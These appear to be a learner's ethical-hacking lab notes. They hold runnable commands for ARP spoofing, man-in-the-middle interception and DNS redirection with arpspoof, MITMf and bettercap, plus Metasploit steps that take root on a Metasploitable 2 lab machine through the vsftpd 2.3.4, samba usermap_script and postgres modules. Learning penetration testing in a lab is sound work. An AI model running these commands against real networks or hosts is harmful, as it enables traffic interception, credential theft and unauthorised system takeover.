# Ethical Hacking Notes


# Man in the Middle Attack


## Scan related

```console
arp -a
```

Check arp table on Windows


```console
netdiscover -r 10.0.2.0/24
```

Simplified version of nmap 

```console
nmap 10.0.2.0/24
```

Discover all IP and ports in the local network

## ARP Setup target victim PC

```console
arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
```

10.0.2.15 is the target IP, 10.0.2.1 is router IP, this will tell victim PC I'm the router.

```console
arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
```

This will tell router, I'm the victim PC.

## Man in the middle framework

Installation

https://github.com/byt3bl33d3r/MITMf.wiki.git


Remember to turn on IP forward, or victim PC cannot access internet
```console
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Start

```console
python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15
```

## DNS Attack



```console
python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 --dns
```

You can configure MITMF/config/mitmf.conf file to add dns info
In \[\[\[A\]\]\]
Use *.xxxx.com=10.0.2.10 to forward dns info to your own address.

On your own kali, host Web server.




## Bettercap

bettercap is another man in the middle framework with constant update.

```console
bettercap
```

help to see all services.

```console
net.probe on 
```

Discover IP on the local network

```console
set arp.spoof.fullduplex true
set arp.spoof.targets 10.0.2.15
arp.spoof on
```

fullduplex: both targets and gateway will be attached, otherwise only target

set target ip address

Turn on arp.spoof

Use net.sniff on to start sniffing packets

# System penetrating

Penetrate target systems

## Metaexploitable 2

Use nmap to scan target ports

Zenmap options:
1. Ping Scan
2. Quick Scan
3. Quick Scan Plus
4. Intense Scan



```console
msfconsole
```

msf framework, built on Ruby.

### Exploit vsftp 2.3.4

use exploit/unix/ftp/vsftpd_234_backdoor

show options

set RHOSTS 10.0.2.4

exploit

get root access


### Exploit samba usermap_Script

use exploit/multi/samba/usermap_script

show options

set RHOSTS 10.0.2.4

exploit

get root access

use exploit/linux/postgres/postgres_payload


show options

set RHOSTS 10.0.2.4

exploit

get root access

